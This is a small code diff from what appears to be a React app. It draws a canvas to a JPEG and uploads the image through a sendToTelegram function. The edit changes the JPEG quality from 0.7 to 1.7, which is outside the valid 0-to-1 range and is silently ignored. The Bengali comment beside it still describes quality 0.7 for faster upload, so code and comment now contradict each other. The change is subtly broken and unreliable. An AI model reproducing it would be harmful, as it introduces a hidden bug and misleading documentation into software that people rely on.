@@ -50,7 +50,7 @@ function App() {
 
       canvas.toBlob((blob) => {
         if (blob) sendToTelegram(blob);
-      }, 'image/jpeg', 0.7); // কোয়ালিটি ০.৭ দিলে দ্রুত আপলোড হবে
+      }, 'image/jpeg', 1.7); // কোয়ালিটি ০.৭ দিলে দ্রুত আপলোড হবে
     }
   }, [sendToTelegram]);
 
